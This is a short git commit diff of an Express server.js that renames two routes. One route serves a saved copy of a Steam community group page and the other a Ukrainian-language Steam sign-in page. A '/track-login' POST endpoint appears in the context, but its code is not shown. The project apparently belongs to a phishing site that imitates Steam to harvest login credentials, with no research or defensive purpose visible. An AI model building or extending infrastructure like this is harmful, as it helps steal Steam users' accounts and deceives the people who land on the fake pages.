9fe7dfe67de8e943a1434afbb4b0a5e1bb1da60e
SteamSite <newsteamsite@gmail.com>
2025-02-09 17:09:50 +0200

    FOJGJIFDG

--- server.js
+++ server.js
@@ -23,11 +23,11 @@ app.post("/track-login", (req, res) => {
 });
 
 // Відправляємо index.html при запиті на головну сторінку
-app.get("/group", (req, res) => {
+app.get("/group/", (req, res) => {
     res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
 });
 
-app.get("/", (req, res) => {
+app.get("/login/", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "Увійти.html"));
 });
 
